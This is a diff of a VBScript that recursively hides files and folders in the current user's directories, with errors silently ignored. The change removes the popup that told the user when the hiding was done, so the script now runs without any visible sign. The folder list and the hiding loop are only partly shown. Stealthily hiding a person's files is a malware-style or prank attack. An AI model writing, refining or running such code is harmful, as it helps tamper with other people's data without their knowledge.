@@ -3,12 +3,6 @@ Option Explicit
 Dim objShell
 Set objShell = CreateObject("WScript.Shell")
 
-' تحديد عنوان ومحتوى الرسالة
-Dim messageTitle, messageContent
-'-----------------------------------------------------------------
-messageTitle = "ِhi"
-messageContent = "ih "
-'-----------------------------------------------------------------
 Sub HideFilesAndFoldersInSpecificDirs()
     Dim userName, folder, folderPath
     userName = objShell.ExpandEnvironmentStrings("%USERNAME%")
@@ -21,14 +15,11 @@ Sub HideFilesAndFoldersInSpecificDirs()
     For Each folder In folderPath
         HideFilesAndFoldersRecursively folder
     Next
-    
-    ' إظهار MessageBox بعد الانتهاء
-    objShell.Popup messageContent, 3, messageTitle, 64
 End Sub
 
 Sub HideFilesAndFoldersRecursively(path)
     On Error Resume Next
-    Dim objFSO, objFolder, objFile, objSubFolder
+    Dim objFSO, objFolder, objFile
     Set objFSO = CreateObject("Scripting.FileSystemObject")
     Set objFolder = objFSO.GetFolder(path)
     
